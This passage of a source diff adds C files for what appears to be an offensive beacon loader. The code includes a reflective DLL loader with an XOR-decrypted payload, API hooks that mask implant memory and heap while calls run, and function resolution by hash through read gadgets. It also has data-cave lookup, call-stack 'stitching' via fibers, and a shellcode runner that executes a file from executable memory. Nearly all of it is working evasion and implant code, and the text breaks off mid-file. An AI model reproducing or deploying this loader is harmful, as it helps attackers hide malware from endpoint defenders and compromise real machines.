+    HANDLE process = (HANDLE)stitch(KERNEL32$OpenProcess, 3, dwDesiredAccess, bInheritHandle, dwProcessId);
+    UnmaskMemory();
+    return process;
+}
+
+HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) {
+    MaskMemory();
+    HANDLE thread = (HANDLE)stitch(KERNEL32$OpenThread, 3, dwDesiredAccess, bInheritHandle, dwThreadId);
+    UnmaskMemory();
+    return thread;
+}
+
+BOOL WINAPI _CloseHandle(HANDLE hObject) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$CloseHandle, 1, hObject);
+    UnmaskMemory();
+    return success;
+}
+
+HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName) {
+    MaskMemory();
+    HANDLE file = (HANDLE)stitch(KERNEL32$CreateFileMappingA, 6, hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);
+    UnmaskMemory();
+    return file;
+}
+
+LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap) {
+    MaskMemory();
+    LPVOID buffer = (LPVOID)stitch(KERNEL32$MapViewOfFile, 5, hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
+    UnmaskMemory();
+    return buffer;
+}
+
+BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$UnmapViewOfFile, 1, lpBaseAddress);
+    UnmaskMemory();
+    return success;
+}
+
+SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
+    MaskMemory();
+    SIZE_T bytes = (SIZE_T)stitch(KERNEL32$VirtualQuery, 3, lpAddress, lpBuffer, dwLength);
+    UnmaskMemory();
+    return bytes;
+}
+
+BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$DuplicateHandle, 7, hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
+    UnmaskMemory();
+    return success;
+}
+
+BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$ReadProcessMemory, 5, hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
+    UnmaskMemory();
+    return success;
+}
+
+BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
+    MaskMemory();
+    BOOL success = (BOOL)stitch(KERNEL32$WriteProcessMemory, 5, hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+    UnmaskMemory();
+    return success;
+}
+
+DWORD WINAPI _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
+    DWORD wait_result = (DWORD)stitch(KERNEL32$WaitForSingleObject, 2, hHandle, 0);
+    if (WAIT_OBJECT_0 != wait_result) {
+        MaskMemory();
+        wait_result = (DWORD)stitch(KERNEL32$WaitForSingleObject, 2, hHandle, dwMilliseconds);
+        UnmaskMemory();
+    }
+    return wait_result;
+}
+
+VOID WINAPI _ExitThread(DWORD dwExitCode) {
+    (VOID)stitch(KERNEL32$ExitThread, 1, dwExitCode);
+}
+
+HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
+    char srvBuf[256], usrBuf[256], pwdBuf[256];
+    if (lpszServerName) { MSVCRT$strncpy(srvBuf, lpszServerName, sizeof(srvBuf)- 1); srvBuf[sizeof(srvBuf) - 1] = 0; lpszServerName = srvBuf; }
+    if (lpszUserName)   { MSVCRT$strncpy(usrBuf, lpszUserName,   sizeof(usrBuf)- 1); usrBuf[sizeof(usrBuf) - 1] = 0; lpszUserName = usrBuf; }
+    if (lpszPassword)   { MSVCRT$strncpy(pwdBuf, lpszPassword,   sizeof(pwdBuf)- 1); pwdBuf[sizeof(pwdBuf) - 1] = 0; lpszPassword = pwdBuf; }
+
+    MaskMemory();
+    HINTERNET connection = (HINTERNET)stitch(WININET$InternetConnectA, 8, hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
+    UnmaskMemory();
+    return connection;
+}
+
+LPVOID WINAPI _HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
+    //dprintf("[heap] HeapAlloc: heap=%p size=%lu\n", hHeap, (DWORD)dwBytes);
+    //LPVOID p = KERNEL32$HeapAlloc(hHeap, dwFlags, dwBytes);
+    LPVOID buffer = NTDLL$RtlAllocateHeap(hHeap, dwFlags, dwBytes);
+    trackAllocation(HEAP_ALLOC, hHeap, buffer, dwBytes);
+    return buffer;
+}
+
+LPVOID WINAPI _HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes) {
+    //dprintf("[heap] HeapReAlloc: heap=%p mem=%p size=%lu\n", hHeap, lpMem, (DWORD)dwBytes);
+    //LPVOID p = KERNEL32$HeapReAlloc(hHeap, dwFlags, lpMem, dwBytes);
+    LPVOID buffer = NTDLL$RtlReAllocateHeap(hHeap, dwFlags, lpMem, dwBytes);
+    if (buffer != NULL) {
+        untrackAllocation(lpMem);
+        trackAllocation(HEAP_ALLOC, hHeap, buffer, dwBytes);
+    }
+    return buffer;
+}
+
+BOOL WINAPI _HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem) {
+    //dprintf("[heap] HeapFree: heap=%p mem=%p\n", hHeap, lpMem);
+    untrackAllocation(lpMem);
+    return KERNEL32$HeapFree(hHeap, dwFlags, lpMem);
+}
+
+BOOL WINAPI _HeapDestroy(HANDLE hHeap) {
+    //dprintf("[heap] HeapDestroy: heap=%p\n", hHeap);
+    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; ) {
+        if (g_heap_alloc_list.pAllocations[i].hHeap == hHeap) {
+            g_heap_alloc_list.pAllocations[i] = g_heap_alloc_list.pAllocations[--g_heap_alloc_list.dwSize];
+        } else {
+            i++;
+        }
+    }
+    return KERNEL32$HeapDestroy(hHeap);
+}
+
+```
+
+`src/loader.c`:
+
+```c
+/*
+ * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
+ *
+ * Redistribution and use in source and binary forms, with or without modification, are
+ * permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, this list of
+ * conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
+ * conditions and the following disclaimer in the documentation and/or other materials provided
+ * with the distribution.
+ *
+ * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
+ * endorse or promote products derived from this software without specific prior written
+ * permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
+ * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
+ * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+ * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+
+#include <windows.h>
+#include <process.h>
+#include "stitch.h"
+#include "masking.h"
+#include "hooks.h"
+#include "tcg.h"
+#include "dfr.h"
+
+#define FLAG(x, y) ( ((x) & (y)) == (y) )
+
+extern BEACON_STATE g_beacon_state;
+
+__attribute__((section(".text")))
+CHAR xorkey[16] = {1};
+
+/*
+ * This is the Crystal Palace convention for getting ahold of data linked with this loader.
+ */
+char __DLLDATA__[0] __attribute__((section("my_data")));
+
+char * findAppendedDLL() {
+    return (char *)&__DLLDATA__;
+}
+
+void ApplySectionPermissions(DLLDATA * dll, char * dst) {
+    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
+    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
+    DWORD                   perms            = 0;
+    DWORD                   oldprot;
+
+    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
+
+    g_beacon_state.numSections = (numberOfSections > MAX_SECTIONS) ? MAX_SECTIONS : numberOfSections;
+
+    for (DWORD x = 0; x < g_beacon_state.numSections; x++) {
+        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE) && FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE))
+            perms = PAGE_EXECUTE_READWRITE;
+        else if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))
+            perms = PAGE_EXECUTE_READ;
+        else if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE))
+            perms = PAGE_READWRITE;
+        else
+            perms = PAGE_READONLY;
+
+        /* Cache section info for UnmaskBeacon */
+        g_beacon_state.sectionVA[x]   = sectionHdr->VirtualAddress;
+        g_beacon_state.sectionSize[x] = sectionHdr->Misc.VirtualSize;
+        g_beacon_state.sectionProt[x] = perms;
+
+        KERNEL32$VirtualProtect(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, perms, &oldprot);
+        sectionHdr++;
+    }
+}
+
+char * unmask(char * srcvalue) {
+    _RESOURCE* dll = (_RESOURCE*)srcvalue;
+    char      * dst = NULL;
+
+    dst = KERNEL32$VirtualAlloc(NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    for (int x = 0; x < dll->length; x++) {
+        dst[x] = dll->value[x] ^ xorkey[x % sizeof(xorkey)];
+    }
+
+    return dst;
+}
+
+/*
+ * Our reflective loader itself, have fun, go nuts!
+ */
+void load() {
+    char       * dst;
+    char       * src;
+    DLLDATA      data;
+    IMPORTFUNCS  funcs;
+
+    g_beacon_state.base = NULL;
+    g_beacon_state.size = 0;
+
+    /* find our DLL appended to this PIC */
+    src = findAppendedDLL();
+    src = unmask(src);
+
+    /* parse our DLL! */
+    ParseDLL(src, &data);
+
+    /* allocate memory for it! */
+    dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+
+    /* load the damned thing */
+    LoadDLL(&data, src, dst);
+
+    /* setup our IMPORTFUNCS data structure */
+    funcs.GetProcAddress = _GetProcAddress;
+    funcs.LoadLibraryA   = LoadLibraryA;
+
+    /* process the imports */
+    ProcessImports(&funcs, &data, dst);
+
+    ApplySectionPermissions(&data, dst);
+
+    /* Enable full-image XOR masking of the loaded beacon. */
+    g_beacon_state.base = dst;
+    g_beacon_state.size = SizeOfDLL(&data);
+
+    /* pass execution to our DLL */
+    const DLLMAIN_FUNC dllEntry = EntryPoint(&data, dst);
+    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
+
+    dprintf("[pid %lu] [GO] Calling DLL\n", KERNEL32$GetCurrentProcessId());
+    dllEntry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
+    dllEntry((HINSTANCE)NULL, 4, NULL);
+}
+
+
+void go() {
+    // Go's frame has to be large enough to swallow the frame size of a given gadget
+    // since we are tailcalling our frame size must be larger than the gadget
+    [[maybe_unused]] volatile CHAR give_me_big_frame[1024] = { 0 };
+    g_clean_state = KERNEL32$ConvertThreadToFiber(NULL);
+    g_run_state = KERNEL32$CreateFiber(0, (LPFIBER_START_ROUTINE)load, NULL);
+
+    register UINT_PTR rsp __asm("rsp");
+    UINT_PTR ret_offset = findReturnAddressOffset((UINT_PTR)__builtin_return_address(0), rsp);
+
+    g_stitch_args = NTDLL$RtlAllocateHeap(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(STITCH_ARG));
+    g_stitch_args->ret_fiber = (UINT_PTR)g_run_state;
+    g_stitch_args->go_frame_size = ret_offset;
+    __asm("jmp stitchMainStub\n" : : "c"(g_stitch_args) : "memory");
+}
+
+```
+
+`src/masking.c`:
+
+```c
+#include "masking.h"
+#include "stitch.h"
+#include "tcg.h"
+#include "dfr.h"
+
+extern HEAP_ALLOCATION_LIST g_heap_alloc_list;
+extern BEACON_STATE g_beacon_state;
+
+void applyxor(char * data, DWORD len) {
+    for (DWORD x = 0; x < len; x++) {
+        data[x] ^= xorkey[x % 16];
+    }
+}
+
+void trackAllocation(enum HEAP_ALLOCATION_METHOD method, HANDLE hHeap, LPVOID lpAddress, SIZE_T dwSize) {
+    // Masking the smaller allocations breaks pivot sleep in CS and I cant be bothered to figure out why
+    if (dwSize < 45) return;
+
+    //dprintf("[heap] Tracking allocation: %p, size: %lu, method: %d\n", lpAddress, (DWORD)dwSize, method);
+    if (g_heap_alloc_list.pAllocations == NULL) {
+        g_heap_alloc_list.pAllocations = MSVCRT$calloc(5, sizeof(HEAP_ALLOCATION));
+        g_heap_alloc_list.dwCapacity = 5;
+    }
+
+    if (g_heap_alloc_list.dwSize >= g_heap_alloc_list.dwCapacity) {
+        g_heap_alloc_list.dwCapacity *= 2;
+        g_heap_alloc_list.pAllocations = MSVCRT$realloc(g_heap_alloc_list.pAllocations, g_heap_alloc_list.dwCapacity * sizeof(HEAP_ALLOCATION));
+    }
+
+    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].method = method;
+    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].hHeap = hHeap;
+    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].lpAddress = lpAddress;
+    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].dwSize = dwSize;
+    g_heap_alloc_list.dwSize++;
+}
+
+void untrackAllocation(LPVOID lpAddress) {
+    //dprintf("[heap] Untracking allocation: %p\n", lpAddress);
+    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
+        if (g_heap_alloc_list.pAllocations[i].lpAddress == lpAddress) {
+            g_heap_alloc_list.pAllocations[i] = g_heap_alloc_list.pAllocations[--g_heap_alloc_list.dwSize];
+            return;
+        }
+    }
+}
+
+void printAllocationsList() {
+    dprintf("[heap] Allocations:\n");
+    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
+        dprintf("[heap] Allocation %lu: %p, Heap: %p, size: %lu, method: %d\n",
+                i,
+                g_heap_alloc_list.pAllocations[i].lpAddress,
+                g_heap_alloc_list.pAllocations[i].hHeap,
+                (DWORD)g_heap_alloc_list.pAllocations[i].dwSize,
+                g_heap_alloc_list.pAllocations[i].method);
+    }
+}
+
+void MaskHeap() {
+    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
+        if (g_heap_alloc_list.pAllocations[i].method == HEAP_ALLOC) {
+            applyxor(g_heap_alloc_list.pAllocations[i].lpAddress, (DWORD)g_heap_alloc_list.pAllocations[i].dwSize);
+        } else {
+            //dprintf("[heap] Non HEAP_ALLOC allocation\n");
+        }
+    }
+}
+
+void MaskBeacon() {
+    if (g_beacon_state.base != NULL) {
+        //dprintf("[+] Masking : 0x%p : %lu\n", g_beacon_state.base, g_beacon_state.size);
+        DWORD oldProt;
+        stitch(KERNEL32$VirtualProtect, 4, g_beacon_state.base, g_beacon_state.size, PAGE_READWRITE, &oldProt);
+        applyxor(g_beacon_state.base, g_beacon_state.size);
+        //dprintf("[+] Masking Complete\n");
+    }
+}
+
+void UnmaskBeacon() {
+    if (g_beacon_state.base != NULL) {
+        applyxor(g_beacon_state.base, g_beacon_state.size);
+        DWORD oldProt;
+        for (DWORD x = 0; x < g_beacon_state.numSections; x++) {
+            stitch(KERNEL32$VirtualProtect, 4, g_beacon_state.base + g_beacon_state.sectionVA[x], g_beacon_state.sectionSize[x], g_beacon_state.sectionProt[x], &oldProt);
+        }
+    }
+}
+
+
+```
+
+`src/masking.h`:
+
+```h
+#pragma once
+
+#include <windows.h>
+
+extern CHAR xorkey[];
+
+enum HEAP_ALLOCATION_METHOD {
+    HEAP_ALLOC,
+    VIRTUAL_ALLOC,
+};
+
+typedef struct {
+    enum HEAP_ALLOCATION_METHOD method;
+    HANDLE hHeap;
+    LPVOID lpAddress;
+    SIZE_T dwSize;
+} HEAP_ALLOCATION, *PHEAP_ALLOCATION;
+
+typedef struct {
+    PHEAP_ALLOCATION pAllocations;
+    DWORD dwSize;
+    DWORD dwCapacity;
+} HEAP_ALLOCATION_LIST, *PHEAP_ALLOCATION_LIST;
+
+extern HEAP_ALLOCATION_LIST gHeapAllocationsList;
+
+#define MAX_SECTIONS 16
+typedef struct {
+    char  * base;
+    DWORD   size;
+    DWORD   numSections;
+    DWORD   sectionVA[MAX_SECTIONS];
+    DWORD   sectionSize[MAX_SECTIONS];
+    DWORD   sectionProt[MAX_SECTIONS];
+} BEACON_STATE, *PBEACON_STATE;
+
+extern BEACON_STATE gBeaconState;
+
+void MaskBeacon();
+void UnmaskBeacon();
+
+void applyxor(char * data, DWORD len);
+
+void trackAllocation(enum HEAP_ALLOCATION_METHOD method, HANDLE hHeap, LPVOID lpAddress, SIZE_T dwSize);
+void untrackAllocation(LPVOID lpAddress);
+void printAllocationsList();
+
+void MaskHeap();
+
+/* KERNEL32 heap hooks (installed via addhook in bingus.spec); defined in
+ * hooks.h, tracking the allocations via the functions in masking.c. */
+LPVOID WINAPI _HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
+LPVOID WINAPI _HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
+BOOL WINAPI _HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
+BOOL WINAPI _HeapDestroy(HANDLE hHeap);
+
+#define UnmaskHeap MaskHeap
+
+/* Mask both the Beacon DLL image and tracked heap allocations. */
+#define MaskMemory()   MaskBeacon(); \
+    MaskHeap()
+#define UnmaskMemory() UnmaskBeacon(); \
+    MaskHeap()
+
+```
+
+`src/runner.c`:
+
+```c
+#include <windows.h>
+#include <process.h>
+#include <stdio.h>
+
+LPVOID ReadFileToBuffer(CHAR* fileName, PSIZE_T sBufSize)
+{
+    FILE* fp;
+    SIZE_T sFileSize;
+
+    fopen_s(&fp, fileName, "rb");
+    fseek(fp, 0, SEEK_END);
+    sFileSize = ftell(fp);
+    rewind(fp);
+    unsigned char* buf = malloc(sFileSize);
+    for ( int i = 0; i < sFileSize; i++ )
+    {
+        buf[i] = fgetc(fp);
+    }
+
+    LPVOID bufAlloc = VirtualAlloc(NULL, sFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(bufAlloc, buf, sFileSize);
+
+    *sBufSize = sFileSize;
+
+    return bufAlloc;
+}
+
+int main(int argc, char* argv[])
+{
+    SIZE_T sShellcodeSize = 0;
+    LPVOID lpShellcodeBuffer = ReadFileToBuffer(argv[1], &sShellcodeSize);
+
+    if (atoi(argv[2]) == 0)
+        ((void(*)())lpShellcodeBuffer)();
+    else
+        //CreateThread(NULL, 0, lpShellcodeBuffer, NULL, 0, NULL);
+        _beginthreadex(NULL, 0, lpShellcodeBuffer, NULL, 0, NULL);
+
+    getchar();
+}
+
+```
+
+`src/services.c`:
+
+```c
+/*
+ * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
+ *
+ * Redistribution and use in source and binary forms, with or without modification, are
+ * permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, this list of
+ * conditions and the following disclaimer.
+ *
+ * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
+ * conditions and the following disclaimer in the documentation and/or other materials provided
+ * with the distribution.
+ *
+ * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
+ * endorse or promote products derived from this software without specific prior written
+ * permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
+ * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
+ * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
+ * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+
+#include <windows.h>
+#include "tcg.h"
+#define FLAG(x, y) ( ((x) & (y)) == (y) )
+
+WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);
+
+#ifdef WIN_X86
+__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
+#endif
+
+char * findDataCave(char * dllBase, int length) {
+	DLLDATA                 data;
+	DWORD                   numberOfSections;
+	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
+	IMAGE_SECTION_HEADER  * sectionNxt       = NULL;
+
+	ParseDLL(dllBase, &data);
+
+	numberOfSections = data.NtHeaders->FileHeader.NumberOfSections;
+	sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data.OptionalHeader, data.NtHeaders->FileHeader.SizeOfOptionalHeader);
+	for (int x = 0; (x + 1) < numberOfSections; x++) {
+		if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_INITIALIZED_DATA)) {
+			sectionNxt      = sectionHdr + 1;
+
+			DWORD size      = sectionNxt->VirtualAddress - sectionHdr->VirtualAddress;
+
+			DWORD cavesize  = size - sectionHdr->SizeOfRawData;
+
+			if (length < cavesize)
+				return dllBase + (sectionNxt->VirtualAddress - cavesize);
+		}
+
+		sectionHdr++;
+	}
+
+	return NULL;
+}
+
+char * getBSS(DWORD length) {
+	HANDLE hModule = KERNEL32$GetModuleHandleA(NULL);
+	char * ptr     = findDataCave(hModule, length);
+
+	if (ptr != NULL)
+		return ptr;
+
+	hModule = KERNEL32$GetModuleHandleA("Kernel32");
+	ptr     = findDataCave(hModule, length);
+	if (ptr != NULL)
+		return ptr;
+
+	return NULL;
+}
+
+static BOOL _memcmp(void * s1, void * s2, SIZE_T n) {
+    BYTE * a = (BYTE *)s1;
+    BYTE * b = (BYTE *)s2;
+    for (SIZE_T i = 0; i < n; i++)
+        if (a[i] != b[i])
+            return FALSE;
+    return TRUE;
+}
+
+LPVOID findReadGadget(HMODULE h_module, OUT PINT8 disp) {
+    UINT_PTR base = (UINT_PTR)h_module;
+    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)base;
+    if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+
+    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base + dos_hdr->e_lfanew);
+    if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    PIMAGE_SECTION_HEADER sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);
+
+    UINT_PTR text_start = 0;
+    UINT_PTR text_end = 0;
+    for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
+        if (_memcmp(sec_hdr[i].Name, ".text", 6)) {
+            text_start = base + sec_hdr[i].VirtualAddress;
+            text_end = text_start + sec_hdr[i].Misc.VirtualSize;
+            break;
+        }
+    }
+    if (text_start == 0) return FALSE;
+
+    BYTE read[3] = { 0x48, 0x8B, 0x40 }; // mov rax, qword ptr [rax +/- 8_disp]
+    for (PBYTE i = (PBYTE)text_start; (UINT_PTR)i < text_end; i++) {
+        if (_memcmp(i, read, 3) && *(i+4) == 0xC3) {
+            *disp = *(PINT8)(i+3);
+            return i;
+        }
+    }
+    return NULL;
+}
+
+__attribute((naked))
+UINT_PTR readViaGadget(LPVOID gadget, INT8 disp, LPVOID address) {
+    __asm(
+    "sub r8, rdx\n"
+    "mov rax, r8\n"
+    "call rcx\n"
+    "ret\n"
+    );
+}
+
+__forceinline DWORD ror( DWORD d )
+{
+    return _rotr( d, 13 );
+}
+
+__forceinline DWORD hash(LPVOID gadget, INT8 disp, char * c)
+{
+    register DWORD h = 0;
+    do
+    {
+        h = ror( h );
+        h += (BYTE)readViaGadget(gadget, disp, c);
+        c++;
+    } while( (BYTE)readViaGadget(gadget, disp, c) );
+
+    return h;
+}
+
+void * findFunctionByHashGadget(char * src, DWORD wantedFunction) {
+    DLLDATA                  data;
+    IMAGE_DATA_DIRECTORY   * exportTableHdr;
+    IMAGE_EXPORT_DIRECTORY * exportDir;
+    DWORD                  * exportName;
+    WORD                   * exportOrdinal;
+    DWORD                  * exportAddress;
+    DWORD                    hashValue;
+    LPVOID                   readGadget;
+    INT8                     disp;
+
+    readGadget = findReadGadget((HMODULE)src, &disp);
+
+    /* parse our DLL! */
+    ParseDLL(src, &data);
+
+    /* grab our export directory */
+    exportTableHdr = GetDataDirectory(&data, IMAGE_DIRECTORY_ENTRY_EXPORT);
+    exportDir      = (IMAGE_EXPORT_DIRECTORY *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportTableHdr->VirtualAddress));
+
+    /* walk the array of exported names/address ordinals */
+    exportName    = (DWORD *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfNames));
+    exportOrdinal = (WORD *) PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfNameOrdinals));
+
+    while (TRUE) {
+        hashValue = hash(readGadget, disp, (char *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, exportName)));
+        if (hashValue == wantedFunction) {
+            /* figure out the base of our AddressOfFunctions array */
+            exportAddress   = (DWORD *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfFunctions));
+
+            /* increment it by the current value of our exportOrdinal array */
+            exportAddress  += (WORD)readViaGadget(readGadget, disp, exportOrdinal);
+
+            /* and... there-in is our virtual address to the actual ptr we want */
+            return PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, exportAddress));
+        }
+
+        exportName++;
+        exportOrdinal++;
+    }
+}
+
+/*
+ * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
+ * See dfr "resolve" "ror13" "KERNEL32, NTDLL" in loader.spec
+ */
+FARPROC resolve(DWORD modHash, DWORD funcHash) {
+	HANDLE hModule = findModuleByHash(modHash);
+	return findFunctionByHashGadget(hModule, funcHash);
+}
+
+/*
+ * This is our default DFR resolver. It resolves Win32 APIs not handled by another resolver.
+ */
+FARPROC resolve_ext(char * mod, char * func) {
+	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
+	if (hModule == NULL)
+		hModule = LoadLibraryA(mod);
+
+	return GetProcAddress(hModule, func);
+}
+
+```
+
+`src/stitch.c`:
+
+```c
+#include <windows.h>
+#include <psapi.h>
+#include <stddef.h>
+#include "stitch.h"
+#include "unwind.h"
+#include "dfr.h"
+#include "tcg.h"
+
+extern PSTITCH_ARG g_stitch_args;
+extern LPVOID g_clean_state;
+
+// This *should* work for any callback/execution that comes from a clean base, not just APC2
+// CreateThread from unbacked is not usally a huge deal, CreateTread targeting unbacked is usually more scrutinized.
+//     CFG really hurts this approach though (if GetInjectedThreadEx)
+
+// TODO: getFrameSize funciton
+// TODO: both of these do not support callers with frame pointers
+
+static BOOL _memcmp(void * s1, void * s2, SIZE_T n) {
+    BYTE * a = (BYTE *)s1;
+    BYTE * b = (BYTE *)s2;
+    for (SIZE_T i = 0; i < n; i++)
+        if (a[i] != b[i])
+            return FALSE;
+    return TRUE;
+}
+
+// Couldnt get cpl to play nice with an asm label
+__attribute__((naked))
+void stitchMainStub(PSTITCH_ARG arg) {
+    __asm("mov rbx, rcx\n"
+          "jmp stitchMain\n");
+}
+
+// If your caller uses a frame pointer I will kill you
+__attribute__((naked))
